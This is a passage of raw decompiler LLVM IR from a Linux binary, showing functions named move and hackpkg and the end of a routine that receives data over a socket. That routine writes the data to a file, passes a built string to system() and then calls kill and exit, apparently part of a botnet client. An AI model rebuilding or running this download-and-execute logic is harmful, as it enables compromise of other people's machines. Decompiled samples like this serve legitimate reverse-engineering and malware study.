  %v1_80535fe = icmp eq i1 %v7_80535fc, false
  br i1 %v1_80535fe, label %dec_label_pc_805361b, label %dec_label_pc_8053600

dec_label_pc_8053600:                             ; preds = %dec_label_pc_80535f0
  %v3_8053603 = load i32, i32* %v2_80535f3.pre-phi, align 4
  store i32 %v3_8053603, i32* %edx.global-to-local, align 4
  %v0_8053609 = load i32, i32* @ebp, align 4
  %v2_8053609 = add nsw i32 %storemerge178, -5224
  %v3_8053609 = add i32 %v2_8053609, %v0_8053609
  %v4_8053609 = inttoptr i32 %v3_8053609 to i8*
  %v5_8053609 = load i8, i8* %v4_8053609, align 1
  %v3_8053610 = inttoptr i32 %v3_8053603 to i8*
  store i8 %v5_8053609, i8* %v3_8053610, align 1
  %v0_8053612 = load i32, i32* %edx.global-to-local, align 4
  %v1_8053612 = add i32 %v0_8053612, 1
  store i32 %v1_8053612, i32* @edx, align 4
  store i32 %v1_8053612, i32* %v2_80535f3.pre-phi, align 4
  br label %dec_label_pc_8053655

dec_label_pc_805361b:                             ; preds = %dec_label_pc_80535f0
  %v0_805361e = load i32, i32* @ebp, align 4
  %v2_805361e = add nsw i32 %storemerge178, -5224
  %v3_805361e = add i32 %v2_805361e, %v0_805361e
  %v4_805361e = inttoptr i32 %v3_805361e to i8*
  %v5_805361e = load i8, i8* %v4_805361e, align 1
  %v0_8053628 = load i32, i32* @esp, align 4
  %v5_8053628 = icmp ult i32 %v0_8053628, 8
  store i1 %v5_8053628, i1* %cf.global-to-local, align 1
  %v5_805362f = call i32 @putc_unlocked(i8 %v5_805361e, i32 %v4_805345d)
  %v0_8053634 = load i32, i32* @esp, align 4
  %v2_8053634 = icmp ugt i32 %v0_8053634, -17
  store i1 %v2_8053634, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8053655

dec_label_pc_8053639:                             ; preds = %dec_label_pc_80535e0
  %v0_805363c = load i32, i32* @ebp, align 4
  %v2_805363c = add nsw i32 %storemerge178, -5224
  %v3_805363c = add i32 %v2_805363c, %v0_805363c
  %v4_805363c = inttoptr i32 %v3_805363c to i8*
  %v5_805363c = load i8, i8* %v4_805363c, align 1
  %v0_8053646 = load i32, i32* @esp, align 4
  %v5_8053646 = icmp ult i32 %v0_8053646, 8
  store i1 %v5_8053646, i1* %cf.global-to-local, align 1
  %v5_805364d = call i32 @__GI_fputc(i8 %v5_805363c, i32 %v4_805345d)
  %v0_8053652 = load i32, i32* @esp, align 4
  %v2_8053652 = icmp ugt i32 %v0_8053652, -17
  store i1 %v2_8053652, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8053655

dec_label_pc_8053655:                             ; preds = %dec_label_pc_805361b, %dec_label_pc_8053600, %dec_label_pc_8053639
  %v4_8053655 = add nuw nsw i32 %storemerge178, 1
  %v10_805365b = icmp ult i32 %v4_8053655, %v6_80535ae
  store i1 %v10_805365b, i1* %cf.global-to-local, align 1
  %exitcond202 = icmp eq i32 %v4_8053655, %v6_80535ae
  br i1 %exitcond202, label %dec_label_pc_805359d, label %dec_label_pc_80535e0

dec_label_pc_8053665:                             ; preds = %dec_label_pc_805359d
  store i1 %v5_8053235, i1* %cf.global-to-local, align 1
  %tmp131 = inttoptr i32 %v4_805345d to i16*
  %v3_805366b = call i32 @__GI_fclose(i16* %tmp131)
  store i1 %v5_80532c5, i1* %cf.global-to-local, align 1
  %v2_805367d = ptrtoint i32* %stack_var_-1132 to i32
  %tmp132 = bitcast i32* %stack_var_-1132 to i8*
  %v6_8053684 = call i32 @__GI_memset(i8* %tmp132, i32 0, i32 4096)
  store i1 %v5_8053235, i1* %cf.global-to-local, align 1
  %v3_80536a8 = call i32 @sprintf(i32 %v2_805367d, i32 ptrtoint ([70 x i8]* @global_var_806a7d4.491 to i32))
  br label %dec_label_pc_8053921

dec_label_pc_80536b5:                             ; preds = %dec_label_pc_8053404
  %v4_80536c2 = call i32 @__GI_fopen(i32 ptrtoint ([8 x i8]* @global_var_806a81a.492 to i32), i32 ptrtoint ([3 x i8]* @global_var_8068a98.45 to i32))
  %v0_80536c7 = load i32, i32* @esp, align 4
  %v2_80536c7 = icmp ugt i32 %v0_80536c7, -17
  store i1 %v2_80536c7, i1* %cf.global-to-local, align 1
  %v2_80536d4 = ptrtoint i32* %stack_var_-5228 to i32
  br label %dec_label_pc_80536cd

dec_label_pc_80536cd:                             ; preds = %dec_label_pc_80537f6, %dec_label_pc_80536b5
  %v6_80536de = call i32 @recv(i32 %v5_80531e5, i32 %v2_80536d4, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp134 = icmp slt i32 %v6_80536de, 1
  br i1 %tmp134, label %dec_label_pc_805380a.preheader.loopexit29, label %dec_label_pc_80536f3

dec_label_pc_80536f3:                             ; preds = %dec_label_pc_80536cd
  %v4_80536f3 = add i32 %v6_80536de, -4095
  %v8_80536f3 = icmp ult i32 %v6_80536de, 4095
  %v9_80536f3 = sub i32 4094, %v6_80536de
  %v10_80536f3 = and i32 %v9_80536f3, %v6_80536de
  %v11_80536f3 = icmp slt i32 %v10_80536f3, 0
  store i1 %v8_80536f3, i1* %cf.global-to-local, align 1
  %v12_80536f3 = icmp eq i32 %v4_80536f3, 0
  %v13_80536f3 = icmp slt i32 %v4_80536f3, 0
  %v3_80536fa = icmp eq i1 %v13_80536f3, %v11_80536f3
  %v4_80536fa = icmp eq i1 %v12_80536f3, false
  %v5_80536fa = and i1 %v4_80536fa, %v3_80536fa
  br i1 %v5_80536fa, label %dec_label_pc_8053713.lr.ph, label %dec_label_pc_80536fc

dec_label_pc_80536fc:                             ; preds = %dec_label_pc_80536f3
  %v0_80536ff = load i32, i32* @ebp, align 4
  %v2_80536ff = add i32 %v6_80536de, -5224
  %v3_80536ff = add i32 %v2_80536ff, %v0_80536ff
  %v4_80536ff = inttoptr i32 %v3_80536ff to i8*
  store i8 0, i8* %v4_80536ff, align 1
  br label %dec_label_pc_8053713.lr.ph

dec_label_pc_8053713.lr.ph:                       ; preds = %dec_label_pc_80536fc, %dec_label_pc_80536f3
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8053713

dec_label_pc_8053713:                             ; preds = %dec_label_pc_8053713.lr.ph, %dec_label_pc_80537f6
  %storemerge11169 = phi i32 [ 0, %dec_label_pc_8053713.lr.ph ], [ %v4_80537f6, %dec_label_pc_80537f6 ]
  store i32 %storemerge11169, i32* %edx.global-to-local, align 4
  %v2_805371e = add i32 %storemerge11169, %v2_80536d4
  %v7_805371e = icmp ult i32 %v2_805371e, %v2_80536d4
  store i1 %v7_805371e, i1* %cf.global-to-local, align 1
  store i1 false, i1* @df, align 1
  %v4_805373b = inttoptr i32 %v2_805371e to i8*
  store i32 %v2_805371e, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_8068a9b.46 to i32), i32* @edi, align 4
  %v7_805374d = call i32 @_strncmp(i8* %v4_805373b, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8068a9b.46, i32 0, i32 0), i32 4)
  %v8_805374d = urem i32 %v7_805374d, 2
  %v9_805374d = icmp eq i32 %v8_805374d, 0
  %v0_805374f = load i1, i1* %cf.global-to-local, align 1
  %v2_805374f = or i1 %v0_805374f, %v9_805374d
  %v3_805374f = zext i1 %v2_805374f to i32
  %v4_805374f = load i32, i32* %edx.global-to-local, align 4
  %v5_805374f = and i32 %v4_805374f, -256
  %v6_805374f = or i32 %v3_805374f, %v5_805374f
  %v7_805374f = xor i32 %v6_805374f, 1
  store i32 %v7_805374f, i32* @edx, align 4
  %v3_8053755 = and i32 %v7_805374d, -256
  %v1_8053757 = trunc i32 %v7_805374f to i8
  %v3_8053757 = zext i1 %v0_805374f to i8
  %v4_8053757 = sub nsw i8 %v1_8053757, %v3_8053757
  %v15_8053757 = icmp eq i8 %v4_8053757, 0
  %v20_8053757 = zext i8 %v4_8053757 to i32
  %v23_8053757 = or i32 %v20_8053757, %v3_8053755
  store i32 %v23_8053757, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8053760 = icmp eq i1 %v15_8053757, false
  br i1 %v1_8053760, label %dec_label_pc_80537f6, label %dec_label_pc_8053766

dec_label_pc_8053766:                             ; preds = %dec_label_pc_8053713
  %v4_8053766 = add i32 %storemerge11169, 4
  %v1_8053775 = add i32 %v4_80536c2, 52
  %v2_8053775 = inttoptr i32 %v1_8053775 to i32*
  %v1_805377f = add i32 %v4_80536c2, 16
  %v2_805377f = inttoptr i32 %v1_805377f to i32*
  %v1_8053785 = add i32 %v4_80536c2, 28
  %v2_8053785 = inttoptr i32 %v1_8053785 to i32*
  %v10_80537eb153 = icmp ult i32 %v4_8053766, %v6_80536de
  store i1 %v10_80537eb153, i1* %cf.global-to-local, align 1
  %v5_80537ee159 = icmp slt i32 %v4_8053766, %v6_80536de
  br i1 %v5_80537ee159, label %dec_label_pc_805376c, label %dec_label_pc_805380a.preheader

dec_label_pc_805376c:                             ; preds = %dec_label_pc_8053766, %dec_label_pc_80537e5
  %storemerge24.in160 = phi i32 [ %v4_80537e5, %dec_label_pc_80537e5 ], [ %v4_8053766, %dec_label_pc_8053766 ]
  %v3_8053775 = load i32, i32* %v2_8053775, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8053778 = icmp eq i32 %v3_8053775, 0
  br i1 %v1_8053778, label %dec_label_pc_80537c7, label %dec_label_pc_805377c

dec_label_pc_805377c:                             ; preds = %dec_label_pc_805376c
  %v3_805377f = load i32, i32* %v2_805377f, align 4
  store i32 %v3_805377f, i32* @edx, align 4
  %v3_8053785 = load i32, i32* %v2_8053785, align 4
  %v7_8053788 = icmp ult i32 %v3_805377f, %v3_8053785
  store i1 %v7_8053788, i1* %cf.global-to-local, align 1
  %v1_805378a = icmp eq i1 %v7_8053788, false
  br i1 %v1_805378a, label %dec_label_pc_80537a7, label %dec_label_pc_805378c

dec_label_pc_805378c:                             ; preds = %dec_label_pc_805377c
  %v3_805378f = load i32, i32* %v2_805377f, align 4
  store i32 %v3_805378f, i32* %edx.global-to-local, align 4
  %v0_8053795 = load i32, i32* @ebp, align 4
  %v2_8053795 = add i32 %storemerge24.in160, -5224
  %v3_8053795 = add i32 %v2_8053795, %v0_8053795
  %v4_8053795 = inttoptr i32 %v3_8053795 to i8*
  %v5_8053795 = load i8, i8* %v4_8053795, align 1
  %v3_805379c = inttoptr i32 %v3_805378f to i8*
  store i8 %v5_8053795, i8* %v3_805379c, align 1
  %v0_805379e = load i32, i32* %edx.global-to-local, align 4
  %v1_805379e = add i32 %v0_805379e, 1
  store i32 %v1_805379e, i32* @edx, align 4
  store i32 %v1_805379e, i32* %v2_805377f, align 4
  br label %dec_label_pc_80537e5

dec_label_pc_80537a7:                             ; preds = %dec_label_pc_805377c
  %v0_80537aa = load i32, i32* @ebp, align 4
  %v2_80537aa = add i32 %storemerge24.in160, -5224
  %v3_80537aa = add i32 %v2_80537aa, %v0_80537aa
  %v4_80537aa = inttoptr i32 %v3_80537aa to i8*
  %v5_80537aa = load i8, i8* %v4_80537aa, align 1
  %v0_80537b6 = load i32, i32* @esp, align 4
  %v5_80537b6 = icmp ult i32 %v0_80537b6, 8
  store i1 %v5_80537b6, i1* %cf.global-to-local, align 1
  %v5_80537bd = call i32 @putc_unlocked(i8 %v5_80537aa, i32 %v4_80536c2)
  %v0_80537c2 = load i32, i32* @esp, align 4
  %v2_80537c2 = icmp ugt i32 %v0_80537c2, -17
  store i1 %v2_80537c2, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_80537e5

dec_label_pc_80537c7:                             ; preds = %dec_label_pc_805376c
  %v0_80537ca = load i32, i32* @ebp, align 4
  %v2_80537ca = add i32 %storemerge24.in160, -5224
  %v3_80537ca = add i32 %v2_80537ca, %v0_80537ca
  %v4_80537ca = inttoptr i32 %v3_80537ca to i8*
  %v5_80537ca = load i8, i8* %v4_80537ca, align 1
  %v0_80537d6 = load i32, i32* @esp, align 4
  %v5_80537d6 = icmp ult i32 %v0_80537d6, 8
  store i1 %v5_80537d6, i1* %cf.global-to-local, align 1
  %v5_80537dd = call i32 @__GI_fputc(i8 %v5_80537ca, i32 %v4_80536c2)
  %v0_80537e2 = load i32, i32* @esp, align 4
  %v2_80537e2 = icmp ugt i32 %v0_80537e2, -17
  store i1 %v2_80537e2, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_80537e5

dec_label_pc_80537e5:                             ; preds = %dec_label_pc_80537a7, %dec_label_pc_805378c, %dec_label_pc_80537c7
  %v4_80537e5 = add i32 %storemerge24.in160, 1
  %v10_80537eb = icmp ult i32 %v4_80537e5, %v6_80536de
  store i1 %v10_80537eb, i1* %cf.global-to-local, align 1
  %exitcond201 = icmp eq i32 %v4_80537e5, %v6_80536de
  br i1 %exitcond201, label %dec_label_pc_805380a.preheader, label %dec_label_pc_805376c

dec_label_pc_805380a.preheader.loopexit29:        ; preds = %dec_label_pc_80536cd
  %.pre52 = add i32 %v4_80536c2, 52
  %.pre53 = inttoptr i32 %.pre52 to i32*
  %.pre55 = add i32 %v4_80536c2, 16
  %.pre56 = inttoptr i32 %.pre55 to i32*
  %.pre57 = add i32 %v4_80536c2, 28
  %.pre58 = inttoptr i32 %.pre57 to i32*
  br label %dec_label_pc_805380a.preheader

dec_label_pc_805380a.preheader:                   ; preds = %dec_label_pc_8053766, %dec_label_pc_80537e5, %dec_label_pc_805380a.preheader.loopexit29
  %v2_8053866.pre-phi = phi i32* [ %.pre58, %dec_label_pc_805380a.preheader.loopexit29 ], [ %v2_8053785, %dec_label_pc_80537e5 ], [ %v2_8053785, %dec_label_pc_8053766 ]
  %v2_8053860.pre-phi = phi i32* [ %.pre56, %dec_label_pc_805380a.preheader.loopexit29 ], [ %v2_805377f, %dec_label_pc_80537e5 ], [ %v2_805377f, %dec_label_pc_8053766 ]
  %v2_8053856.pre-phi = phi i32* [ %.pre53, %dec_label_pc_805380a.preheader.loopexit29 ], [ %v2_8053775, %dec_label_pc_80537e5 ], [ %v2_8053775, %dec_label_pc_8053766 ]
  br label %dec_label_pc_805380a

dec_label_pc_80537f6:                             ; preds = %dec_label_pc_8053713
  %v4_80537f6 = add nuw nsw i32 %storemerge11169, 1
  %v10_80537fc = icmp ult i32 %v4_80537f6, %v6_80536de
  store i1 %v10_80537fc, i1* %cf.global-to-local, align 1
  %v5_80537ff = icmp slt i32 %v4_80537f6, %v6_80536de
  br i1 %v5_80537ff, label %dec_label_pc_8053713, label %dec_label_pc_80536cd

dec_label_pc_805380a:                             ; preds = %dec_label_pc_80538c6, %dec_label_pc_805380a.preheader
  %v6_805381b = call i32 @recv(i32 %v5_80531e5, i32 %v2_80536d4, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp135 = icmp slt i32 %v6_805381b, 1
  br i1 %tmp135, label %dec_label_pc_80538da, label %dec_label_pc_8053830

dec_label_pc_8053830:                             ; preds = %dec_label_pc_805380a
  %v4_8053830 = add i32 %v6_805381b, -4095
  %v8_8053830 = icmp ult i32 %v6_805381b, 4095
  %v9_8053830 = sub i32 4094, %v6_805381b
  %v10_8053830 = and i32 %v9_8053830, %v6_805381b
  %v11_8053830 = icmp slt i32 %v10_8053830, 0
  store i1 %v8_8053830, i1* %cf.global-to-local, align 1
  %v12_8053830 = icmp eq i32 %v4_8053830, 0
  %v13_8053830 = icmp slt i32 %v4_8053830, 0
  %v3_8053837 = icmp eq i1 %v13_8053830, %v11_8053830
  %v4_8053837 = icmp eq i1 %v12_8053830, false
  %v5_8053837 = and i1 %v4_8053837, %v3_8053837
  br i1 %v5_8053837, label %dec_label_pc_805384d.lr.ph, label %dec_label_pc_8053839

dec_label_pc_8053839:                             ; preds = %dec_label_pc_8053830
  %v0_805383c = load i32, i32* @ebp, align 4
  %v2_805383c = add i32 %v6_805381b, -5224
  %v3_805383c = add i32 %v2_805383c, %v0_805383c
  %v4_805383c = inttoptr i32 %v3_805383c to i8*
  store i8 0, i8* %v4_805383c, align 1
  br label %dec_label_pc_805384d.lr.ph

dec_label_pc_805384d.lr.ph:                       ; preds = %dec_label_pc_8053839, %dec_label_pc_8053830
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_805384d

dec_label_pc_805384d:                             ; preds = %dec_label_pc_80538c6, %dec_label_pc_805384d.lr.ph
  %storemerge9151 = phi i32 [ 0, %dec_label_pc_805384d.lr.ph ], [ %v4_80538c6, %dec_label_pc_80538c6 ]
  %v3_8053856 = load i32, i32* %v2_8053856.pre-phi, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8053859 = icmp eq i32 %v3_8053856, 0
  br i1 %v1_8053859, label %dec_label_pc_80538a8, label %dec_label_pc_805385d

dec_label_pc_805385d:                             ; preds = %dec_label_pc_805384d
  %v3_8053860 = load i32, i32* %v2_8053860.pre-phi, align 4
  store i32 %v3_8053860, i32* @edx, align 4
  %v3_8053866 = load i32, i32* %v2_8053866.pre-phi, align 4
  %v7_8053869 = icmp ult i32 %v3_8053860, %v3_8053866
  store i1 %v7_8053869, i1* %cf.global-to-local, align 1
  %v1_805386b = icmp eq i1 %v7_8053869, false
  br i1 %v1_805386b, label %dec_label_pc_8053888, label %dec_label_pc_805386d

dec_label_pc_805386d:                             ; preds = %dec_label_pc_805385d
  %v3_8053870 = load i32, i32* %v2_8053860.pre-phi, align 4
  store i32 %v3_8053870, i32* %edx.global-to-local, align 4
  %v0_8053876 = load i32, i32* @ebp, align 4
  %v2_8053876 = add nsw i32 %storemerge9151, -5224
  %v3_8053876 = add i32 %v2_8053876, %v0_8053876
  %v4_8053876 = inttoptr i32 %v3_8053876 to i8*
  %v5_8053876 = load i8, i8* %v4_8053876, align 1
  %v3_805387d = inttoptr i32 %v3_8053870 to i8*
  store i8 %v5_8053876, i8* %v3_805387d, align 1
  %v0_805387f = load i32, i32* %edx.global-to-local, align 4
  %v1_805387f = add i32 %v0_805387f, 1
  store i32 %v1_805387f, i32* @edx, align 4
  store i32 %v1_805387f, i32* %v2_8053860.pre-phi, align 4
  br label %dec_label_pc_80538c6

dec_label_pc_8053888:                             ; preds = %dec_label_pc_805385d
  %v0_805388b = load i32, i32* @ebp, align 4
  %v2_805388b = add nsw i32 %storemerge9151, -5224
  %v3_805388b = add i32 %v2_805388b, %v0_805388b
  %v4_805388b = inttoptr i32 %v3_805388b to i8*
  %v5_805388b = load i8, i8* %v4_805388b, align 1
  %v0_8053897 = load i32, i32* @esp, align 4
  %v5_8053897 = icmp ult i32 %v0_8053897, 8
  store i1 %v5_8053897, i1* %cf.global-to-local, align 1
  %v5_805389e = call i32 @putc_unlocked(i8 %v5_805388b, i32 %v4_80536c2)
  %v0_80538a3 = load i32, i32* @esp, align 4
  %v2_80538a3 = icmp ugt i32 %v0_80538a3, -17
  store i1 %v2_80538a3, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_80538c6

dec_label_pc_80538a8:                             ; preds = %dec_label_pc_805384d
  %v0_80538ab = load i32, i32* @ebp, align 4
  %v2_80538ab = add nsw i32 %storemerge9151, -5224
  %v3_80538ab = add i32 %v2_80538ab, %v0_80538ab
  %v4_80538ab = inttoptr i32 %v3_80538ab to i8*
  %v5_80538ab = load i8, i8* %v4_80538ab, align 1
  %v0_80538b7 = load i32, i32* @esp, align 4
  %v5_80538b7 = icmp ult i32 %v0_80538b7, 8
  store i1 %v5_80538b7, i1* %cf.global-to-local, align 1
  %v5_80538be = call i32 @__GI_fputc(i8 %v5_80538ab, i32 %v4_80536c2)
  %v0_80538c3 = load i32, i32* @esp, align 4
  %v2_80538c3 = icmp ugt i32 %v0_80538c3, -17
  store i1 %v2_80538c3, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_80538c6

dec_label_pc_80538c6:                             ; preds = %dec_label_pc_8053888, %dec_label_pc_805386d, %dec_label_pc_80538a8
  %v4_80538c6 = add nuw nsw i32 %storemerge9151, 1
  %v10_80538cc = icmp ult i32 %v4_80538c6, %v6_805381b
  store i1 %v10_80538cc, i1* %cf.global-to-local, align 1
  %exitcond = icmp eq i32 %v4_80538c6, %v6_805381b
  br i1 %exitcond, label %dec_label_pc_805380a, label %dec_label_pc_805384d

dec_label_pc_80538da:                             ; preds = %dec_label_pc_805380a
  store i1 %v5_8053235, i1* %cf.global-to-local, align 1
  %tmp136 = inttoptr i32 %v4_80536c2 to i16*
  %v3_80538e0 = call i32 @__GI_fclose(i16* %tmp136)
  store i1 %v5_80532c5, i1* %cf.global-to-local, align 1
  %v2_80538f2 = ptrtoint i32* %stack_var_-1132 to i32
  %tmp137 = bitcast i32* %stack_var_-1132 to i8*
  %v6_80538f9 = call i32 @__GI_memset(i8* %tmp137, i32 0, i32 4096)
  store i32 ptrtoint ([188 x i8]* @global_var_806a824.493 to i32), i32* %edx.global-to-local, align 4
  store i1 %v5_80532c5, i1* %cf.global-to-local, align 1
  %tmp138 = bitcast i32* %stack_var_-1132 to i16*
  %v6_8053919 = call i32 @memcpy(i16* %tmp138, i32 ptrtoint ([188 x i8]* @global_var_806a824.493 to i32), i32 188)
  br label %dec_label_pc_8053921

dec_label_pc_8053921:                             ; preds = %dec_label_pc_8053665, %dec_label_pc_80538da
  %v2_8053940.pre-phi = phi i32 [ %v2_805367d, %dec_label_pc_8053665 ], [ %v2_80538f2, %dec_label_pc_80538da ]
  store i1 %v5_8053235, i1* %cf.global-to-local, align 1
  %v2_8053927 = call i32 @close(i32 %arg1)
  store i1 %v5_8053235, i1* %cf.global-to-local, align 1
  %v2_8053935 = call i32 @close(i32 %v5_80531e5)
  store i1 %v5_8053235, i1* %cf.global-to-local, align 1
  %v2_8053947 = call i32 @system(i32 %v2_8053940.pre-phi)
  store i1 %v5_80536b5, i1* %cf.global-to-local, align 1
  %v4_8053956 = call i32 @kill(i32 9, i32 0)
  store i1 %v5_8053235, i1* %cf.global-to-local, align 1
  %v2_8053963 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8053968

dec_label_pc_8053968:                             ; preds = %entry, %dec_label_pc_8053921
  %v0_805396e = phi i32 [ %v2_80531a6, %entry ], [ %v2_8053963, %dec_label_pc_8053921 ]
  ret i32 %v0_805396e

; uselistorder directives
  uselistorder i32 %storemerge9151, { 0, 3, 2, 1 }
  uselistorder i32 %v4_8053830, { 1, 0 }
  uselistorder i32 %v6_805381b, { 0, 4, 3, 1, 5, 7, 6, 2 }
  uselistorder i32 %v4_80537f6, { 1, 0, 2 }
  uselistorder i32* %v2_8053860.pre-phi, { 2, 1, 0 }
  uselistorder i32 %v4_80537e5, { 1, 2, 0 }
  uselistorder i32 %storemerge24.in160, { 0, 3, 2, 1 }
  uselistorder i1 %v0_805374f, { 1, 0 }
  uselistorder i32 %v7_805374d, { 1, 0 }
  uselistorder i32 %storemerge11169, { 2, 0, 3, 1 }
  uselistorder i32 %v4_80536f3, { 1, 0 }
  uselistorder i32 %v6_80536de, { 8, 7, 3, 0, 2, 1, 6, 4, 9, 11, 10, 5 }
  uselistorder i32 %v2_80536d4, { 1, 3, 0, 2 }
  uselistorder i32 %v4_80536c2, { 10, 5, 6, 0, 1, 2, 3, 4, 8, 7, 9 }
  uselistorder i32 %storemerge178, { 0, 3, 2, 1 }
  uselistorder i32 %v4_80535c3, { 1, 0 }
  uselistorder i32 %v6_80535ae, { 0, 4, 3, 1, 5, 7, 6, 2 }
  uselistorder i32 %v4_8053589, { 1, 0, 2 }
  uselistorder i32* %v2_80535f3.pre-phi, { 2, 1, 0 }
  uselistorder i32 %v4_805357c, { 1, 2, 0 }
  uselistorder i32 %storemerge22.in187, { 0, 3, 2, 1 }
  uselistorder i1 %v0_80534ea, { 1, 0 }
  uselistorder i32 %v7_80534e8, { 1, 0 }
  uselistorder i32 %storemerge8196, { 2, 0, 3, 1 }
  uselistorder i32 %v4_805348e, { 1, 0 }
  uselistorder i32 %v6_8053479, { 8, 7, 3, 0, 2, 1, 6, 4, 9, 11, 10, 5 }
  uselistorder i32 %v2_805346f, { 1, 3, 0, 2 }
  uselistorder i32 %v4_805345d, { 10, 5, 6, 0, 1, 2, 3, 4, 8, 7, 9 }
  uselistorder i32 %storemerge13, { 0, 1, 3, 2 }
  uselistorder i32 %v5_8053307, { 1, 0, 2 }
  uselistorder i1 %v5_80532c5, { 2, 5, 4, 6, 3, 1, 0, 7 }
  uselistorder i32 %v2_8053239, { 1, 0, 2 }
  uselistorder i1 %v5_8053235, { 6, 5, 4, 3, 12, 7, 11, 2, 10, 1, 0, 9, 8 }
  uselistorder i32 %v5_80531e5, { 3, 4, 5, 1, 2, 6, 7, 0, 8 }
  uselistorder i32 %v4_80531b6, { 1, 0 }
  uselistorder i32 %v12_8053192, { 1, 2, 0 }
  uselistorder i32* %stack_var_-5260, { 4, 5, 6, 0, 1, 7, 2, 8, 3, 9 }
  uselistorder i32* %stack_var_-108, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-104, { 1, 0, 2 }
  uselistorder i32* %stack_var_-1132, { 0, 1, 4, 2, 5, 3, 6 }
  uselistorder i1* %cf.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 14, 8, 9, 10, 11, 12, 13, 96, 15, 16, 27, 23, 17, 18, 19, 20, 21, 22, 97, 24, 25, 26, 98, 28, 29, 30, 32, 33, 34, 41, 35, 36, 37, 38, 39, 40, 99, 42, 43, 54, 50, 44, 45, 46, 47, 48, 49, 100, 51, 52, 53, 101, 55, 56, 57, 31, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95 }
  uselistorder i32 %arg4, { 2, 3, 0, 1 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8053968, { 1, 0 }
  uselistorder label %dec_label_pc_8053921, { 1, 0 }
  uselistorder label %dec_label_pc_80538c6, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805380a.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80537e5, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805376c, { 1, 0 }
  uselistorder label %dec_label_pc_8053713, { 1, 0 }
  uselistorder label %dec_label_pc_8053655, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805359d.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805357c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053507, { 1, 0 }
  uselistorder label %dec_label_pc_80534ae, { 1, 0 }
  uselistorder label %dec_label_pc_8053404, { 1, 0 }
  uselistorder label %dec_label_pc_8053390, { 1, 0 }
  uselistorder label %dec_label_pc_80532fa, { 1, 0 }
  uselistorder label %dec_label_pc_80532ac, { 1, 0 }
  uselistorder label %dec_label_pc_8053287, { 1, 0 }
  uselistorder label %dec_label_pc_8053216, { 1, 0 }
  uselistorder label %dec_label_pc_80531dc, { 1, 0 }
}

define i32 @move(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp20 = icmp slt i32 %arg3, 1
  %tmp21 = icmp eq i1 %tmp20, false
  br i1 %tmp21, label %entry.dec_label_pc_805399b_crit_edge, label %dec_label_pc_805397b

entry.dec_label_pc_805399b_crit_edge:             ; preds = %entry
  br label %dec_label_pc_805399b

dec_label_pc_805397b:                             ; preds = %entry
  %v3_8053989 = call i32 @Send(i32 %arg1, i32 ptrtoint ([26 x i8]* @global_var_806a8e0.494 to i32))
  %v1_8053996 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_805399b

dec_label_pc_805399b:                             ; preds = %entry.dec_label_pc_805399b_crit_edge, %dec_label_pc_805397b
  %v1_805399e = add i32 %arg4, 4
  %v1_80539a1 = inttoptr i32 %v1_805399e to i32*
  %v2_80539a1 = load i32, i32* %v1_80539a1, align 4
  %v1_80539a7 = inttoptr i32 %v2_80539a1 to i8*
  %v2_80539a7 = call i32 @__GI_strdup(i8* %v1_80539a7)
  store i32 %v2_80539a7, i32* @global_var_807d504.495, align 4
  store i32 1, i32* @global_var_80748e4.496, align 4
  %v1_80539c4 = call i32 @close(i32 %arg1)
  ret i32 %v1_80539c4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805399b, { 1, 0 }
}

define i32 @hackpkg(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-6212 = alloca i32, align 4
  %stack_var_-5957 = alloca i32, align 4
  %stack_var_-5702 = alloca i32, align 4
  %stack_var_-5447 = alloca i32, align 4
  %stack_var_-5192 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-1096 = alloca i32, align 4
  %stack_var_-6252 = alloca i32, align 4
  %v5_80539d9 = icmp ult i32* %stack_var_-6252, inttoptr (i32 8 to i32*)
  store i1 %v5_80539d9, i1* %cf.global-to-local, align 1
  %v5_80539e6 = call i32 @mkdir(i32 ptrtoint ([9 x i8]* @global_var_806a8fa.497 to i32), i16 509)
  store i32 %v5_80539e6, i32* @eax, align 4
  %v5_80539ee = icmp ult i32* %stack_var_-6252, inttoptr (i32 12 to i32*)
  store i1 %v5_80539ee, i1* %cf.global-to-local, align 1
  %v2_80539f4 = call i32 @mfork(i32 %arg2)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80539fc = icmp eq i32 %v2_80539f4, 0
  %v1_80539fe = icmp eq i1 %v1_80539fc, false
